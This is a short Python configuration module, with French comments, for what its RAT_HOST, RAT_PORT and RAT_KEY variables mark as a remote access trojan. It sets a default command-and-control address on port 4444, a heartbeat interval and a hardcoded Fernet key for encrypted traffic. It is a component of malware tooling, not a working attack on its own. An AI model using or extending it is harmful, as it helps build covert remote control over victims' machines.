import os
from cryptography.fernet import Fernet

# config par defaut
DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 4444
BUFFER_SIZE = 4096
HEARTBEAT_INTERVAL = 30

# clé de chiffrement par defaut (en vrai faut la generer)
DEFAULT_KEY = b'ZmDfcTF7_60GrrY167zsiPd67pEvs0aGOv2oasOM1Pg='

class Config:
    def __init__(self):
        self.host = os.getenv('RAT_HOST', DEFAULT_HOST)
        self.port = int(os.getenv('RAT_PORT', DEFAULT_PORT))
        self.key = os.getenv('RAT_KEY', DEFAULT_KEY)
        self.buffer_size = BUFFER_SIZE
        self.heartbeat = HEARTBEAT_INTERVAL
        
    def get_cipher(self):
        # retourne l'objet de chiffrement
        return Fernet(self.key)
        
    def update_server_info(self, host, port):
        # met a jour les infos serveur
        self.host = host
        self.port = port